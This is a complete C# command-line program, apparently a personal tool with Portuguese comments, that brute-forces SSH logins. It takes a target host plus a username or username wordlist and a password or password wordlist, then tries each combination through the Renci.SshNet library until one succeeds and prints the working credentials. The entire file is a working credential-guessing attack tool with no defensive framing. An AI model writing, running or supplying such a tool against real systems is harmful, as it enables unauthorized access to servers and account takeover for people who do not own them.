using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Renci.SshNet;

namespace SSHBruteForce
{
    class Program
    {
        static void Main(string[] args)
        {
            SSHBrute(args);
        }

        static void SSHBrute(string[] args)
        {
            bool ConnectSSH(string hostname, string username, string password, bool verbose)
            {
                try
                {
                    using (var client = new SshClient(hostname, username, password))
                    {
                        client.Connect();

                        if (verbose)
                        {
                            Console.WriteLine($"[*] Tentando: {username}:{password} [*]");
                        }

                        client.Disconnect();
                        Console.WriteLine($"### {username} : {password} ###");
                        return true;
                    }
                }
                catch (Renci.SshNet.Common.SshException)
                {
                    if (verbose)
                    {
                        Console.WriteLine($"[-] Falha: {username}:{password} [-]");
                    }
                }

                return false;
            }

            string hostname = null;
            string username = null;
            string password = null;
            List<string> passwordList = new List<string>();
            List<string> userList = new List<string>();
            bool verbose = false;

            // Analisando os argumentos da linha de comando
            int i = 0;
            while (i < args.Length)
            {
                if (args[i] == "-p")
                {
                    password = args[i + 1];
                    i += 2;
                }
                else if (args[i] == "-wp")
                {
                    passwordList = File.ReadLines(args[i + 1]).ToList();
                    i += 2;
                }
                else if (args[i] == "-u")
                {
                    username = args[i + 1];
                    i += 2;
                }
                else if (args[i] == "-wu")
                {
                    userList = File.ReadLines(args[i + 1]).ToList();
                    i += 2;
                }
                else if (args[i] == "-h")
                {
                    hostname = args[i + 1];
                    i += 2;
                }
                else if (args[i] == "-vv")
                {
                    verbose = true;
                    i++;
                }
                else
                {
                    i++;
                }
            }

            // Verificar se todos os parâmetros necessários foram fornecidos
            if (string.IsNullOrEmpty(hostname) || (string.IsNullOrEmpty(username) && userList.Count == 0))
            {
                Console.WriteLine("Uso: SSHBruteForce.exe -h hostname [-u username | -wu lista_usuarios] [-p senha | -wp lista_senhas] [-vv]");
                Environment.Exit(1);
            }

            if (userList.Count > 0)
            {
                foreach (string user in userList)
                {
                    if (passwordList.Count > 0)
                    {
                        foreach (string pass in passwordList)
                        {
                            if (ConnectSSH(hostname, user, pass, verbose))
                            {
                                return;
                            }
                        }
                    }
                    else if (!string.IsNullOrEmpty(password))
                    {
                        if (ConnectSSH(hostname, user, password, verbose))
                        {
                            return;
                        }
                    }
                }
            }
            else if (!string.IsNullOrEmpty(username))
            {
                if (passwordList.Count > 0)
                {
                    foreach (string pass in passwordList)
                    {
                        if (ConnectSSH(hostname, username, pass, verbose))
                        {
                            return;
                        }
                    }
                }
                else if (!string.IsNullOrEmpty(password))
                {
                    ConnectSSH(hostname, username, password, verbose);
                }
                else
                {
                    Console.WriteLine("Uma senha ou uma lista de senhas deve ser fornecida.");
                }
            }
        }
    }
}
